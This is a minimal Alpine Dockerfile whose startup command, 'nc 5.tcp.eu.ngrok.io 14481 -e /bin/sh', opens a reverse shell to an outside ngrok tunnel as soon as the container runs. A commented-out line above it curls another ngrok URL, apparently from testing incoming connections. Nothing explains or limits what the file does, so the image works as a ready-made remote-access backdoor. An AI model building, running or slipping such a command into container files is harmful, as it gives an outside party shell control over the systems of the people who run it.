FROM alpine:latest

RUN apk add --update curl

#CMD curl https://3923-2a02-8428-bb8c-5601-9eb6-d0ff-fe3e-d5c0.ngrok-free.app/dockerTEST-curl-nc-in-coming
CMD nc 5.tcp.eu.ngrok.io 14481 -e /bin/sh
